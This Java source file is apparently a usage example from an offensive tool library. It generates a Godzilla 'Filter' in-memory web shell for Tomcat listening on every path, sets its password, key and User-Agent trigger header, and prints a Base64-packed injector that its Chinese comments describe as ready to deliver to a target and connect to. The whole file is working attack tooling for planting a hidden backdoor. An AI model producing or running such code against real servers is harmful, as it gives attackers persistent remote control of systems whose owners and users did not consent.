package com.reajason.javaweb.examples.memshell;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PackerRegistry;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.packer.Packers;

/**
 * 强类型写法：给 Tomcat 生成一个 Godzilla Filter 内存马，并用内置 Base64 打包。
 * <p>
 * 三步固定：{@link ShellConfig} 选目标（服务端/工具/挂载类型），{@link InjectorConfig}
 * 控制投递（请求路径/类名），工具 config 填协议参数。没传的字段由生成器补齐默认值。
 *
 * @author ReaJason
 * @since 2026/10/22
 */
public class GodzillaFilter {
    public static void main(String[] args) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellTool(ShellTool.Godzilla)
                .shellType(ShellType.FILTER)
                .build();

        InjectorConfig injectorConfig = InjectorConfig.builder()
                // 内存马监听的路径；不填时生成器补 "/*"
                .urlPattern("/*")
                .build();

        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("Mozilla/5.0")
                .build();

        MemShellResult result = new MemShellGenerator()
                .generate(shellConfig, injectorConfig, godzillaConfig);

        System.out.println("shell 类：" + result.getShellClassName() + "（" + result.getShellSize() + " B）");
        System.out.println("注入器类：" + result.getInjectorClassName() + "（" + result.getInjectorSize() + " B）");
        System.out.println("请求路径：" + result.getInjectorConfig().getUrlPattern());
        System.out.println();
        System.out.println("哥斯拉连接参数：");
        System.out.println("  pass = " + godzillaConfig.getPass());
        System.out.println("  key = " + godzillaConfig.getKey());
        System.out.println("  " + godzillaConfig.getHeaderName() + " = " + godzillaConfig.getHeaderValue());
        System.out.println();
        System.out.println("DefaultBase64 打包结果（投递到目标，触发后即可连接）：");
        System.out.println(PackerRegistry.getInstance().pack(Packers.DefaultBase64, result));
    }
}
